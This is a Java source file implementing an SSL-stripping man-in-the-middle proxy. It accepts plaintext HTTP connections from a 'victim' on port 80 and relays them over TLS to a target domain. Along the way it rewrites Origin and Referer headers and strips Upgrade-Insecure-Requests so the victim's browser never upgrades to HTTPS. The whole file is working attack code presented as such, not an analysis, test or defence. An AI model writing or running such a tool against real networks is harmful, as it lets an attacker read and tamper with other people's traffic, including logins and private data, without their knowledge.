package io.github.danielthedev.gwidt;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.function.Function;

public class SslStripper {
    private static final int HTTP_PORT = 80;
    private static final int HTTPS_PORT = 443;

    /**
     * Start the SSL Stripper
     *
     * @param domain The domain to strip SSL from
     * @throws IOException if socket fails
     */
    public static void sslStrip(String domain) throws IOException {
        try (ServerSocket victimSocketServer = new ServerSocket(HTTP_PORT)) {
            while(!victimSocketServer.isClosed()) {
                Socket victimSocket = victimSocketServer.accept();
                System.out.println("Connected victim");
                new Thread(()->openConnection(victimSocket, HTTPS_PORT, domain)).start();
            }
        }
    }

    /**
     * Open a connection to the website
     *
     * @param victim The victim socket
     * @param port The port to connect to
     * @param domain The domain to connect to
     */
    public static void openConnection(Socket victim, int port, String domain) {
        try {
            SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            SSLSocket websiteSocket = (SSLSocket) sslsocketfactory.createSocket(domain, port);
            System.out.println("Connected to server");
            SocketProxy proxy = new SocketProxy(victim.getInputStream(), victim.getOutputStream(),
                    websiteSocket.getInputStream(), websiteSocket.getOutputStream(), domain);
            proxy.start();
            System.out.println("Close connection");
            victim.close();
            websiteSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * A class to proxy data between two sockets
     */
    static class SocketProxy {
        private final String domain;
        private final InputStream receiverIn;
        private final OutputStream receiverOut;

        private final InputStream senderIn;
        private final OutputStream senderOut;

        /**
         * Constructor for the SocketProxy
         *
         * @param receiverIn receiver input stream
         * @param receiverOut receiver output stream
         * @param senderIn sender input stream
         * @param senderOut sender output stream
         * @param domain spoofed domain
         */
        public SocketProxy(InputStream receiverIn, OutputStream receiverOut, InputStream senderIn,
                           OutputStream senderOut, String domain) {
            this.receiverIn = receiverIn;
            this.receiverOut = receiverOut;
            this.senderIn = senderIn;
            this.senderOut = senderOut;
            this.domain = domain;
        }

        /**
         * Start the proxy
         */
        public void start() {
            // Forward data from server to client
            Thread thread2 = new Thread(()->forward(senderIn, receiverOut, null));

            // Forward data from client to server, modifying requests containing HTTP to HTTPS
            Thread thread1 = new Thread(()->forward(receiverIn, senderOut, data->{
                if(data.contains("Origin: http://" + domain)) {
                    data = data.replace("Origin: http://" + domain, "Origin: https://" + domain);
                }
                if(data.contains("Referer: http://" + domain)) {
                    data = data.replace("Referer: http://" + domain, "Referer: https://" + domain);
                }
                if(data.contains("Upgrade-Insecure-Requests: 1\r\n")) {
                    data = data.replace("Upgrade-Insecure-Requests: 1\r\n", "");
                }
                return data;
            }));
            thread1.setPriority(Thread.MAX_PRIORITY);
            thread2.setPriority(Thread.MAX_PRIORITY);
            thread1.start();
            thread2.start();
            try {
                thread1.join();
                thread2.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }

        /**
         * Forward data from one stream to another
         *
         * @param in input stream
         * @param out output stream
         * @param filter filter function
         */
        private void forward(InputStream in, OutputStream out, Function<String, String> filter) {
            byte[] buffer = new byte[8192];
            int bytesRead;
            try {
                while ((bytesRead = in.read(buffer)) != -1) {
                    if(filter != null) {
                        String dataString = filter.apply(new String(buffer, 0, bytesRead, StandardCharsets.ISO_8859_1));
                        out.write(dataString.getBytes(StandardCharsets.ISO_8859_1));
                        System.out.println("Victim data: " + dataString.length() + " bytes");
                    } else {
                        out.write(buffer, 0, bytesRead);
                        System.out.println("Server data: " + bytesRead + " bytes");
                    }
                    out.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
